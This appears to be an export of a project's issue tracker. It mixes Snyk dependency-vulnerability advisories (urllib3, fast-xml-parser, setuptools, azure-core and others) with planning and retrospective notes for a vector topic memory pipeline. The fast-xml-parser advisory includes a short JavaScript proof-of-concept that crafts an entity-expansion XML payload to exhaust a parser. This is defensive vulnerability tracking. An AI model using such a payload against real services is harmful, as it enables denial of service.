1) Setting the `Proxy-Authorization` header without using urllib3's built-in proxy support.

2) Not disabling HTTP redirects (e.g. with `redirects=False`)

3) Either not using an HTTPS origin server, or having a proxy or target origin that redirects to a malicious origin.

## Workarounds

1) Using the `Proxy-Authorization` header with urllib3's `ProxyManager`.

2) Disabling HTTP redirects using `redirects=False` when sending requests.

3) Not using the `Proxy-Authorization` header.
## Remediation
Upgrade `urllib3` to version 1.26.19, 2.2.2 or higher.
## References
- [GitHub Commit](https://github.com/urllib3/urllib3/commit/40b6d1605814dd1db0a46e202d6e56f2e4c9a468)
- [GitHub Commit](https://github.com/urllib3/urllib3/commit/accff72ecc2f6cf5a76d9570198a93ac7c90270e)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-PYTHON-URLLIB3-7267250)

issues.title: Coarsen Semantic Reinforcement Memory buckets and add batched LLM fine-tuned topic naming

issues.description:
Wire all pieces together inside `VectorTopicMemory.generate()`. This is the final integration epic. The block orchestrates the full pipeline:

1. Resolve dataset items via `DatasetResolver`
2. Compute embeddings via `EmbeddingService` (cache-aware)
3. Rebuild OpenSearch index (blue/green alias swap)
4. Run global clustering on pre-computed embeddings
5. Update memory weights (reinforcement + decay)
6. Emit structured report output

Also implements the `mode: incremental` option for assigning new items to existing clusters without re-clustering.

## Definition of Done

- `generate()` method in `VectorTopicMemory` orchestrates all stages in order
- Dataset resolution uses `DatasetResolver` from `plexus/reports/blocks/data_utils.py`
- Embedding pipeline uses `EmbeddingService` with S3 cache
- OpenSearch index rebuilt with blue/green swap
- Global clustering produces topic assignments
- Memory weights applied with reinforcement and decay
- Output schema includes: status, cluster_version, topics (with labels, weights, tiers), summary, items_processed, cache_hit_rate, index_name
- Incremental mode assigns new items via KNN without re-clustering
- All scenarios in child stories pass

## Depends On

All prior epics (1, 2, 4, 5, 6)

## Key Files

- Modify: `plexus/reports/blocks/vector_topic_memory.py`
- Modify: `plexus/reports/blocks/vector_topic_memory_test.py`

## XML Entity Expansion

**Severity:** high
**Package:** fast-xml-parser@4.4.1
**File:** `dashboard/package.json`

**CVSS Score:** 8.7  
**Exploit Maturity:** proof-of-concept  
**Snyk Priority Score:** 756/1000

### CVEs
- [CVE-2026-26278](https://nvd.nist.gov/vuln/detail/CVE-2026-26278)

**Fix:** Pin `fast-xml-parser` to version 4.5.4, 5.3.6 or later.

### Details
## Overview
[fast-xml-parser](https://www.npmjs.org/package/fast-xml-parser) is a Validate XML, Parse XML, Build XML without C/C++ based libraries

Affected versions of this package are vulnerable to XML Entity Expansion in `replaceEntitiesValue()` when handling excessive `DOCTYPE` input. An attacker can cause excessive resource consumption and make the application unresponsive by submitting malicious XML input with large text entities referenced multiple times. This is a bypass for Billion Laughs protection in `DocTypeReader.js`, which prevents excessive referencing within and entity, but doesn't prevent repeated expansion of large entities.

## Workaround 
This vulnerability can be mitigated by disabling `DOCTYPE` parsing using the `processEntities: false` option.
## PoC
```js
const { XMLParser } = require('fast-xml-parser');

const entity = 'A'.repeat(1000);
const refs = '&big;'.repeat(100);
const xml = `<!DOCTYPE foo [<!ENTITY big "${entity}">]><root>${refs}</root>`;

console.time('parse');
new XMLParser().parse(xml);
console.timeEnd('parse');
```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](https://security.snyk.io/vuln/SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `fast-xml-parser` to version 4.5.4, 5.3.6 or higher.
## References
- [GitHub Commit](https://github.com/NaturalIntelligence/fast-xml-parser/commit/910dae5be2de2955e968558fadf6e8f74f117a77)
- [GitHub Release](https://github.com/NaturalIntelligence/fast-xml-parser/releases/tag/v5.3.6)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-JS-FASTXMLPARSER-15307668)
issues.title: [Snyk] SNYK-JS-FASTXMLPARSER-15307668 in fast-xml-parser@4.4.1

## Denial of Service (DoS)

**Severity:** high
**Package:** pillow@9.5.0
**File:** `score-processor-lambda/requirements.txt`

**CVSS Score:** 7.5  
**Snyk Priority Score:** 589/1000

### CVEs
No CVE assigned.

**Fix:** Pin `pillow` to version 10.2.0 or later.

### Details
## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) if the size of individual glyphs extends beyond the bitmap image, when using `PIL.ImageFont.ImageFont` function. Exploiting this vulnerability could lead to a system crash.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](https://security.snyk.io/vuln/SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `pillow` to version 10.2.0 or higher.

issues.description:
## Improper Control of Generation of Code ('Code Injection')

**Severity:** high
**Package:** setuptools@40.5.0
**File:** `requirements.txt`

**CVSS Score:** 7.5  
**Exploit Maturity:** proof-of-concept  
**Snyk Priority Score:** 696/1000

### CVEs
- [CVE-2024-6345](https://nvd.nist.gov/vuln/detail/CVE-2024-6345)

**Fix:** Pin `setuptools` to version 70.0.0 or later.

### Details
## Overview

Affected versions of this package are vulnerable to Improper Control of Generation of Code ('Code Injection') through the `package_index` module's download functions due to the unsafe usage of `os.system`. An attacker can execute arbitrary commands on the system by providing malicious URLs or manipulating the URLs retrieved from package index servers.

**Note**

Because `easy_install` and `package_index` are deprecated, the exploitation surface is reduced, but it's conceivable through social engineering or minor compromise to a package index could grant remote access.
## Remediation
Upgrade `setuptools` to version 70.0.0 or higher.
## References
- [GitHub Commit](https://github.com/pypa/setuptools/commit/88807c7062788254f654ea8c03427adc859321f0)
- [GitHub Issue](https://github.com/pypa/setuptools/issues/4331)
- [GitHub PR](https://github.com/pypa/setuptools/pull/4332)
- [PoC](https://huntr.com/bounties/d6362117-ad57-4e83-951f-b8141c6e7ca5)


### Reference

issues.description:
## Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')

**Severity:** medium
**Package:** azure-identity@1.15.0
**File:** `score-processor-lambda/requirements.txt`

**CVSS Score:** 5.5  
**Snyk Priority Score:** 489/1000

### CVEs
- [CVE-2024-35255](https://nvd.nist.gov/vuln/detail/CVE-2024-35255)

**Fix:** Pin `azure-identity` to version 1.16.1 or later.

### Details
## Overview
[azure-identity](https://pypi.org/project/azure-identity) is a Microsoft Azure Identity Library for Python

Affected versions of this package are vulnerable to Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition') in the authentication process. An attacker can elevate privileges by exploiting race conditions during the token validation steps. This is only exploitable if the application is configured to use multiple threads or processes for handling authentication requests.

**Notes:**

1) An attacker who successfully exploited the vulnerability could elevate privileges and read any file on the file system with SYSTEM access permissions;

2) An attacker who successfully exploits this vulnerability can only obtain read access to the system files by exploiting this vulnerability. The attacker cannot perform write or delete operations on the files;

3) The vulnerability exists in the following credential types: `DefaultAzureCredential` and `ManagedIdentityCredential`;

4) The vulnerability exists in the following credential types:

`ManagedIdentityApplication` (.NET)

`ManagedIdentityApplication` (Java)

`ManagedIdentityApplication` (Node.js)
## Remediation
Upgrade `azure-identity` to version 1.16.1 or higher.
## References
- [GitHub Commit](https://github.com/AzureAD/microsoft-authentication-library-for-dotnet/commit/fddb2c4011c79a7efda2df053ca05b87b8a1303c)
- [GitHub Commit](https://github.com/AzureAD/microsoft-authentication-library-for-java/commit/9a07472cedbde7a1013a6fc81da91f2a2c6d67a1)

- [GitHub Commit](https://github.com/Azure/azure-sdk-for-js/commit/c6aa75d312ae463e744163cedfd8fc480cc8d492)
- [GitHub Commit](https://github.com/Azure/azure-sdk-for-net/commit/2db9a0f33668ae9cf0331613e1cd612bee105e1c)

comments.author: ryan.porter
comments.text:
## Planned Story Ordering

Stories are sequenced so each builds on testable foundations laid by prior stories. Three independent work streams can start in parallel.

```mermaid
graph TD
    E1[Epic 1: Block Shell] --> E7[Epic 7: Full Orchestration]
    E2[Epic 2: Embedding Cache] --> E4[Epic 4: OpenSearch Client]
    E3[Epic 3: CDK Infra] --> E4
    E4 --> E5[Epic 5: Global Clustering]
    E2 --> E5
    E5 --> E6[Epic 6: Memory Weights]
    E6 --> E7
    E5 --> E7
```

**Parallel start:**
- Epic 1: Block Shell (1.1 → 1.2)
- Epic 2: Embedding Cache (2.1 → 2.2 → 2.3)
- Epic 3: CDK Infra [separate repo] (3.1 → 3.2)

**Then sequential:**
- Epic 4: OpenSearch Client (4.1 → 4.2 → 4.3) — needs Epics 2 + 3
- Epic 5: Global Clustering (5.1 → 5.2) — needs Epics 2 + 4
- Epic 6: Memory Weights (6.1 → 6.2) — needs Epic 5
- Epic 7: Full Orchestration (7.1 → 7.2 → 7.3) — needs all above

comments.author: ryan.porter
comments.text:
## Retrospective Notes (2026-03-04)

### Mistakes we made
- **Epic 3 scope mismatch**: Original spec said CDK in a *separate repo*. We built it in Plexus `infrastructure/` instead. Epic 3 remains open; infra is done in-repo.
- **Ran before infra ready**: Tried to run VectorTopicMemory report before OpenSearch was deployed. Block requires `OPENSEARCH_ENDPOINT` and `EMBEDDING_CACHE_BUCKET`.
- **Domain name length**: `plexus-topic-memory-development` exceeded AWS 28-char limit → renamed to `plexus-vtm-development`.
- **T3 multi-AZ**: Had to add `multi_az_with_standby_enabled=False` for t3.small.search.

### Current state
- OpenSearch CDK stack: `infrastructure/stacks/opensearch_stack.py` (domain `plexus-vtm-development`, t3.small.search, 10GB EBS, single node)
- S3 bucket: `plexus-embeddings-development` for embedding cache
- Deploy script: `infrastructure/deploy_opensearch.py`
- Config loader: `opensearch.endpoint` → `OPENSEARCH_ENDPOINT`, `embedding_cache.bucket` → `EMBEDDING_CACHE_BUCKET`
- Embeddings: all-MiniLM-L6-v2 (384 dims), configurable via `embedding.model_id`

### Next steps
1. Confirm OpenSearch deployment completes (~10–15 min)
2. Set `OPENSEARCH_ENDPOINT` and `EMBEDDING_CACHE_BUCKET` in .plexus/config.yaml or env
3. Run report with VectorTopicMemory block + valid data source (e.g. customer-calls)

comments.text:

- OpenSearch stack deployed (plexus-opensearch-development)

- VectorTopicMemory block runs end-to-end: config validation → dataset resolution → (would proceed to embed → index → cluster → memory weights)

### Blocker
- DataSource "customer-calls" not found in account. VectorTopicMemory needs a valid data source (name, key, or ID) with text content. Run with data_source=<valid-id> once a DataSource exists.

issues.description:
# Persistent Vector Topic Memory / Semantic Reinforcement Memory

## Outcome Summary
This initiative now includes a completed S3 Vectors migration path while keeping OpenSearch available in the prototype CDK stack for side-by-side operation.

## What Was Implemented
### 1. Kanbus Scope Added and Executed
- Epic: `plx-736728` — S3 Vectors cutover and validation
- Tasks:
  - `plx-2e3a3d` — dual-store infrastructure update
  - `plx-891859` — runtime migration from OpenSearch to S3 Vectors
  - `plx-2e3c35` — deployment and real-world validation runs

### 2. Infrastructure (Dual Store)
- Prototype stack now provisions and retains both:
  - OpenSearch domain
  - S3 Vectors bucket/index
  - Embeddings S3 bucket
- Stack deployment verified in `us-west-2` with `UPDATE_COMPLETE`.
- Confirmed outputs include `OpenSearchEndpoint`, `S3VectorBucketName`, `S3VectorIndexName`, and `EmbeddingsBucketName`.

### 3. Runtime Migration
- Semantic Reinforcement Memory runtime now uses S3 Vectors for vector indexing/query paths.
- Added S3 Vectors adapter and tests.
- Updated report templates/config mappings to `s3_vectors.*` configuration keys.
- Fixed live-run bug where S3 Vectors API rejected requests containing both `indexArn` and bucket/index simultaneously.

### 4. Validation Evidence
- Local targeted tests:
  - `pytest -q plexus/reports/blocks/vector_topic_memory_test.py plexus/analysis/s3vectors_client_test.py`
  - Result: `8 passed`
- Real-world report validations completed successfully, including:
  - `d60f2f2f-076a-4477-888a-af438a44a75e`
  - `cccd9ddf-5231-4f21-91ca-4a1f7f7bcec2`
  - `f0ee6a94-bc18-49fe-b453-bc09a6c47731`

issues.description:
## Memory Leak

**Severity:** low
**Package:** sqlite3/libsqlite3-0@3.46.1-7
**File:** `score-processor-lambda/Dockerfile`

**CVSS Score:** 4.3  
**Snyk Priority Score:** 150/1000

### CVEs
- [CVE-2021-45346](https://nvd.nist.gov/vuln/detail/CVE-2021-45346)

**Fix:** No automatic fix available. Review manually.

### Details
## NVD Description
**_Note:_** _Versions mentioned in the description apply only to the upstream `sqlite3` package and not the `sqlite3` package as distributed by `Debian`._
_See `How to fix?` for `Debian:13` relevant fixed versions and status._

A Memory Leak vulnerability exists in SQLite Project SQLite3 3.35.1 and 3.37.0 via maliciously crafted SQL Queries (made via editing the Database File), it is possible to query a record, and leak subsequent bytes of memory that extend beyond the record, which could let a malicious user obtain sensitive information. NOTE: The developer disputes this as a vulnerability stating that If you give SQLite a corrupted database file and submit a query against the database, it might read parts of the database that you did not intend or expect.
## Remediation
There is no fixed version for `Debian:13` `sqlite3`.
## References
- [https://security-tracker.debian.org/tracker/CVE-2021-45346](https://security-tracker.debian.org/tracker/CVE-2021-45346)
- [https://github.com/guyinatuxedo/sqlite3_record_leaking](https://github.com/guyinatuxedo/sqlite3_record_leaking)
- [https://security.netapp.com/advisory/ntap-20220303-0001/](https://security.netapp.com/advisory/ntap-20220303-0001/)
- [https://sqlite.org/forum/forumpost/056d557c2f8c452ed5](https://sqlite.org/forum/forumpost/056d557c2f8c452ed5)
- [https://sqlite.org/forum/forumpost/53de8864ba114bf6](https://sqlite.org/forum/forumpost/53de8864ba114bf6)
- [https://www.sqlite.org/cves.html#status_of_recent_sqlite_cves](https://www.sqlite.org/cves.html#status_of_recent_sqlite_cves)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-DEBIAN13-SQLITE3-5696112)

issues.description:
## Deserialization of Untrusted Data

**Severity:** high
**Package:** azure-core@1.30.1
**File:** `score-processor-lambda/requirements.txt`

**CVSS Score:** 7.7  
**Snyk Priority Score:** 599/1000

### CVEs
- [CVE-2026-21226](https://nvd.nist.gov/vuln/detail/CVE-2026-21226)

**Fix:** Pin `azure-core` to version 1.38.0 or later.

### Details
## Overview
[azure-core](https://pypi.org/project/azure-core) is a Microsoft Azure Core Library for Python

Affected versions of this package are vulnerable to Deserialization of Untrusted Data in the shared client library. An attacker can execute arbitrary code by sending specially crafted data to be deserialized over a network connection.

## Details

Serialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.

_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, thus allowing the attacker to control the state or the flow of the execution.
  
## Remediation
Upgrade `azure-core` to version 1.38.0 or higher.
## References
- [GitHub ChangeLog](https://github.com/Azure/azure-sdk-for-python/blob/6d2e6431ea0991861640e449e51e894247a7771a/sdk/core/azure-core/CHANGELOG.md#1380-2026-01-12)
- [Microsoft Security Advisory](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-21226)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-PYTHON-AZURECORE-14927372)
issues.title: [Snyk] SNYK-PYTHON-AZURECORE-14927372 in azure-core@1.30.1
